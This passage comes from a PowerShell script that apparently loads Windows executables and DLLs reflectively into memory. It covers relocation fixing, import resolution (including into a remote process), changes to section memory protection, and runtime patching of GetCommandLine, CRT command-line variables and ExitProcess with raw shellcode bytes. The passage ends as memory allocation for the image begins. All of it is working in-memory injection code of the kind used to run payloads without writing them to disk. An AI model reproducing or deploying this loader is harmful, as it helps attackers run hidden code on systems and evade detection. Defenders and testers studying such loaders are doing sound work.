				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					}
					else
					{
						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
